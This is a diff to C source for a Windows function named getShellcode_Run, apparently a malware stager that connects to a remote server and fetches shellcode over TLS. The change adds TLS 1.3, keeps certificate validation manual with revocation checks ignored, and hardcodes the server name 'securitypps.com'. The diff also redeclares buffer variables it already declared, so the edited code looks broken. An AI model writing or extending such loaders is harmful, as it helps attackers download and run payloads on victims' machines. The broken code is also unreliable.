@@ -107,14 +107,17 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     DebugOutput("Connected to server successfully\n");
 
     // Initialize SSL/TLS
+    // Set up SCHANNEL_CRED structure
+    SCHANNEL_CRED schannelCred = { 0 };
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
-    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;  // Use TLS 1.2 for compatibility
-    schannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS |
+    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT; // Enable TLS 1.2 and TLS 1.3
+    schannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | 
                            SCH_CRED_MANUAL_CRED_VALIDATION |  // Disable automatic validation
-                           SCH_CRED_IGNORE_NO_REVOCATION_CHECK |
-                           SCH_CRED_IGNORE_REVOCATION_OFFLINE;
+                           SCH_CRED_IGNORE_NO_REVOCATION_CHECK | 
+                           SCH_CRED_IGNORE_REVOCATION_OFFLINE; // Ignore certificate revocation checks
     
-    secStatus = AcquireCredentialsHandleA(
+    // Acquire credentials handle
+    SECURITY_STATUS secStatus = AcquireCredentialsHandleA(
         NULL,
         UNISP_NAME_A,
         SECPKG_CRED_OUTBOUND,
@@ -131,12 +134,24 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         return;
     }
     
-    DebugOutput("Calling InitializeSecurityContext...\n");
+    DebugOutput("Credentials handle acquired successfully\n");
+    
+    // Prepare for TLS handshake
+    SecBufferDesc outBuffer;
+    SecBuffer outBuffers[1];
+    outBuffers[0].pvBuffer = NULL;
+    outBuffers[0].BufferType = SECBUFFER_TOKEN;
+    outBuffers[0].cbBuffer = 0;
+    outBuffer.cBuffers = 1;
+    outBuffer.pBuffers = outBuffers;
+    outBuffer.ulVersion = SECBUFFER_VERSION;
+    
+    // Initialize Security Context
     secStatus = InitializeSecurityContextA(
         &hCred,
         NULL,
-        host,  // Use hostname, not IP address
-        ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_STREAM,
+        "securitypps.com",  // Use the hostname of the server
+        ISC_REQ_CONFIDENTIALITY | ISC_REQ_STREAM,  // Minimal flags for TLS 1.3
         0,
         0,
         NULL,
@@ -147,18 +162,19 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         NULL
     );
     
-    if (secStatus == SEC_E_OK) {
-        DebugOutput("SSL handshake completed successfully.\n");
-    } else if (secStatus == SEC_I_CONTINUE_NEEDED) {
-        DebugOutput("SSL handshake continuation required.\n");
+    if (secStatus == SEC_I_CONTINUE_NEEDED) {
+        DebugOutput("SSL handshake continuation required\n");
         send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
         FreeContextBuffer(outBuffers[0].pvBuffer);
+    } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
+        DebugOutput("SEC_E_INCOMPLETE_MESSAGE: Waiting for more data\n");
+    } else if (secStatus == SEC_E_OK) {
+        DebugOutput("SSL handshake completed successfully\n");
     } else {
         DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
         cleanup(&ConnectSocket, &hCred, &hContext);
         return;
     }
-
     SecBufferDesc outBuffer, inBuffer;
     SecBuffer outBuffers[1], inBuffers[2];
 
